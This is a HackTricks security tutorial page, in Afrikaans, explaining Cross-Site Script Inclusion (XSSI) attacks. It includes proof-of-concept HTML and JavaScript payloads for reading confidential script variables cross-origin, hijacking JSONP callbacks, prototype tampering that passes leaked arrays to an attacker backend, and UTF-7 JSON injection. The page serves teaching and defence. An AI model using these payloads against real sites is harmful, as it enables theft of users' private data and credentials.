# XSSI (Cross-Site Script Inclusion)

{{#include ../banners/hacktricks-training.md}}

## Basiese Inligting

**Cross-Site Script Inclusion (XSSI)** is 'n kwesbaarheid wat ontstaan uit die aard van die `script` tag in HTML. Anders as die meeste hulpbronne, wat onderhewig is aan die **Same-Origin Policy (SOP)**, kan skripte van verskillende domeine ingesluit word. Hierdie gedrag is bedoel om die gebruik van biblioteke en ander hulpbronne wat op verskillende bedieners gehoste is, te fasiliteer, maar dit stel ook 'n potensiële sekuriteitsrisiko in.

### Sleutelkenmerke van **XSSI**:

- **Omseiling van SOP**: Skripte is vrygestel van die **Same-Origin Policy**, wat dit moontlik maak om oor domeine ingesluit te word.
- **Data Blootstelling**: 'n Aanvaller kan hierdie gedrag benut om data wat via die `script` tag gelaai is, te lees.
- **Impak op Dinamiese JavaScript/JSONP**: **XSSI** is veral relevant vir dinamiese JavaScript of **JSON met Padding (JSONP)**. Hierdie tegnologieë gebruik dikwels "ambient-authority" inligting (soos koekies) vir outentisering. Wanneer 'n skripversoek na 'n ander gasheer gemaak word, word hierdie geloofsbriewe (bv. koekies) outomaties in die versoek ingesluit.
- **Outentiseringstoken Lek**: As 'n aanvaller 'n gebruiker se blaaier kan mislei om 'n skrip van 'n bediener wat hulle beheer, aan te vra, mag hulle in staat wees om sensitiewe inligting wat in hierdie versoeke vervat is, te bekom.

### Tipes

1. **Statische JavaScript** - Dit verteenwoordig die konvensionele vorm van XSSI.
2. **Statische JavaScript met Outentisering** - Hierdie tipe is uniek omdat dit outentisering vereis om toegang te verkry.
3. **Dinamiese JavaScript** - Betrek JavaScript wat dinamies inhoud genereer.
4. **Nie-JavaScript** - Verwys na kwesbaarhede wat nie direk JavaScript betrek nie.

**Die volgende inligting is 'n opsomming van [https://www.scip.ch/en/?labs.20160414](https://www.scip.ch/en/?labs.20160414)**. Kyk daarna vir verdere besonderhede.

### Gereelde XSSI

In hierdie benadering is private inligting ingebed in 'n wêreldwyd toeganklike JavaScript-lêer. Aanvallers kan hierdie lêers identifiseer deur metodes soos lêerlees, sleutelwoordsoektogte, of gereelde uitdrukkings. Sodra dit geleë is, kan die skrip wat private inligting bevat, ingesluit word in kwaadwillige inhoud, wat ongeoorloofde toegang tot sensitiewe data moontlik maak. 'n Voorbeeld van 'n uitbuitingsmetode word hieronder getoon:
```html
<script src="https://www.vulnerable-domain.tld/script.js"></script>
<script>
alert(JSON.stringify(confidential_keys[0]))
</script>
```
### Dinamiese-JavaScript-gebaseerde-XSSI en Geverifieerde-JavaScript-XSSI

Hierdie tipes XSSI-aanvalle behels dat vertroulike inligting dinamies by die skrif gevoeg word in reaksie op 'n gebruiker se versoek. Opsporing kan gedoen word deur versoeke met en sonder koekies te stuur en die antwoorde te vergelyk. As die inligting verskil, kan dit die teenwoordigheid van vertroulike inligting aandui. Hierdie proses kan geoutomatiseer word met behulp van gereedskap soos die [DetectDynamicJS](https://github.com/luh2/DetectDynamicJS) Burp-uitbreiding.

As vertroulike data in 'n globale veranderlike gestoor word, kan dit uitgebuit word met behulp van soortgelyke metodes as dié wat in Gereelde XSSI gebruik word. As die vertroulike data egter in 'n JSONP-antwoord ingesluit is, kan aanvallers die terugroepfunksie oorneem om die inligting te verkry. Dit kan gedoen word deur óf globale voorwerpe te manipuleer óf 'n funksie op te stel wat deur die JSONP-antwoord uitgevoer moet word, soos hieronder gedemonstreer:
```html
<script>
var angular = function () {
return 1
}
angular.callbacks = function () {
return 1
}
angular.callbacks._7 = function (leaked) {
alert(JSON.stringify(leaked))
}
</script>
<script
src="https://site.tld/p?jsonp=angular.callbacks._7"
type="text/javascript"></script>
```

```html
<script>
leak = function (leaked) {
alert(JSON.stringify(leaked))
}
</script>
<script src="https://site.tld/p?jsonp=leak" type="text/javascript"></script>
```
Vir veranderlikes wat nie in die globale naamruimte woon nie, kan _prototype tampering_ soms uitgebuit word. Hierdie tegniek benut JavaScript se ontwerp, waar kode-interpretasie behels om die prototipe-ketting te deurkruis om die aangeroepde eienskap te vind. Deur sekere funksies te oorskry, soos `Array` se `slice`, kan aanvallers toegang verkry tot en nie-globale veranderlikes lek:
```javascript
Array.prototype.slice = function () {
// leaks ["secret1", "secret2", "secret3"]
sendToAttackerBackend(this)
}
```
Verder besonderhede oor aanvalsvektore kan gevind word in die werk van Sekuriteitsnavorsers [Sebastian Lekies](https://twitter.com/slekies), wat 'n lys van [vektore](http://sebastian-lekies.de/leak/) onderhou.

### Non-Script-XSSI

Takeshi Terada se navorsing stel 'n ander vorm van XSSI bekend, waar Non-Script lêers, soos CSV, oor oorsprong gelek word deur as bronne in 'n `script` tag ingesluit te word. Historiese voorbeelde van XSSI, soos Jeremiah Grossman se 2006 aanval om 'n volledige Google adresboek te lees en Joe Walker se 2007 JSON data lek, beklemtoon die erns van hierdie bedreigings. Boonop beskryf Gareth Heyes 'n aanvalvariant wat UTF-7 geënkodeerde JSON insluit om die JSON-formaat te ontsnap en skripte uit te voer, effektief in sekere blaaiers:
```javascript
;[
{
friend: "luke",
email:
"+ACcAfQBdADsAYQBsAGUAcgB0ACgAJwBNAGEAeQAgAHQAaABlACAAZgBvAHIAYwBlACAAYgBlACAAdwBpAHQAaAAgAHkAbwB1ACcAKQA7AFsAewAnAGoAbwBiACcAOgAnAGQAbwBuAGU-",
},
]
```

```html
<script
src="http://site.tld/json-utf7.json"
type="text/javascript"
charset="UTF-7"></script>
```
{{#include ../banners/hacktricks-training.md}}
